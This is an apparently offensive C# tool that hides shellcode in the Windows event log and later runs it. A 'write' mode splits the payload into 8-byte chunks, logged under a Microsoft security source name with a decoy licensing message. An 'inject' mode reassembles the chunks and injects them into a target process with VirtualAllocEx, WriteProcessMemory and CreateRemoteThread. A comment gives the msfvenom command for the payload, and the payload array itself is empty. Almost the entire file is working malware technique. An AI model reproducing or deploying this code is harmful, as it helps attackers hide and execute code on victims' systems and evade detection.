using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace HiddenEventLogs
{
    class Program
    {
        static void Main(string[] args)
        {
            string sourceName = "Microsoft-Windows-Security-SPP";
            string myLogName = EventLog.LogNameFromSourceName(sourceName, ".");
            int pid = 0;            
            if (args.Length == 0) {
                Console.WriteLine("Please provide an argument!");
                return;
            }
            if (args[0] == "write")
            {
                //Write payload into event logs
                //msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f csharp
                byte[] payload = new byte[296] { };                
                int event_id = 12290;
                string strmessage = "The client has processed an activation reponse from the key management service machine!";
                writeEventlogs(payload, strmessage, Delegates.EVENTLOG_INFORMATION_TYPE, event_id, sourceName);
                Console.WriteLine("[+] Payload size: " + payload.Length + " bytes!");
            }
            else if (args[0] == "inject")
            {
                if (args.Length != 2)
                {
                    Console.WriteLine("Please provide PID as second argument");
                    return;
                }
                else
                {
                    pid = int.Parse(args[1]);
                    byte[] payload = queryEventlogs(myLogName, sourceName);                    
                    vanilla_process_injection(pid, payload);
                }
            }            
           
        }

        static void writeEventlogs(byte[] payload, string text, ushort logType, int logEventId, string sourceName)
        {            
            if (EventLog.SourceExists(sourceName))
            {                 
                //register event source
                IntPtr hEventLog = Delegates.RegisterEventSource(null, sourceName);
                int no_of_chunks = payload.Length / 8;
                byte[] chunk = new byte[no_of_chunks];
                int new_size = 0;
                
                for (int i=0;i<no_of_chunks; i++)
                {
                    chunk = payload.Take(8).ToArray();
                    new_size = payload.Length - 8;
                    payload = payload.Skip(8).Take(new_size).ToArray();
                    uint dataSize = (uint)(chunk != null ?chunk.Length : 0);
                    Delegates.ReportEvent(hEventLog, logType, 0x4142, (uint) logEventId, IntPtr.Zero, 1, dataSize, new string[] { text }, chunk);
                }
                //Deregister event source
                Delegates.DeregisterEventSource(hEventLog);
                Console.WriteLine("[+] " + no_of_chunks + " events written!");
                Console.WriteLine("[+] Payload written to event logs.");
            }
            else {
                Console.WriteLine("[-] Source does not exist!");
                return;
            }
        }
        static byte[] queryEventlogs(String eventLogName, string sourceName)
        {
            int counter = 0;
            EventLog myLog = new EventLog();
            myLog.Log = eventLogName;
            myLog.Source = sourceName;
            List<byte> total = new List<byte> { };
            foreach (EventLogEntry log in myLog.Entries)
            {
                if (log.CategoryNumber == 16706) //0x4142
                {
                    total.AddRange(log.Data);
                    counter++;
                }
                                              
            }
            byte[] array = total.ToArray();
            Console.WriteLine("[+] " + counter + " events read!");
            Console.WriteLine("[+] Payload of size " + array.Length + " bytes extracted!");
            return array;
        }

        static void vanilla_process_injection(int pid, byte[] payload)
        {            
            IntPtr Processh = Delegates.OpenProcess(Delegates.PROCESS_ALL_ACCESS, false, pid);            
            Console.WriteLine("[+] Process handle >> " + Processh);
            IntPtr remoteBuffer = Delegates.VirtualAllocEx(Processh, IntPtr.Zero, payload.Length, (Delegates.AllocationType.Reserve | Delegates.AllocationType.Commit), Delegates.MemoryProtection.PAGE_EXECUTE_READWRITE);
            Console.WriteLine("[+] Remote buffer address >> " + remoteBuffer.ToString("X"));
            IntPtr byteswritten;
            Delegates.WriteProcessMemory(Processh, remoteBuffer, payload, payload.Length, out byteswritten);
            Console.WriteLine("[+] "+byteswritten + " bytes written!");
            if (Delegates.CreateRemoteThread(Processh, IntPtr.Zero, 0, remoteBuffer, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.WriteLine("[+] Process Injection succeeded!");
            }
            else
            {
                Console.WriteLine("[X] Process Injection failed!");
            }            
        }
    }
    class Delegates
    {
        public const ushort EVENTLOG_INFORMATION_TYPE = 0x0004;
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int ReportEvent(IntPtr hHandle, ushort wType, ushort wCategory, uint dwEventID, IntPtr uSid, ushort wStrings, uint dwDataSize, string[] lpStrings, byte[] bData);
        [DllImport("advapi32.dll")]
        public static extern IntPtr RegisterEventSource(string lpUNCServerName, string lpSourceName);
        [DllImport("advapi32", SetLastError = true)]
        public static extern bool DeregisterEventSource(IntPtr hEventLog);
        public const int PROCESS_ALL_ACCESS = (0x1F0FFF);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }
    }
}
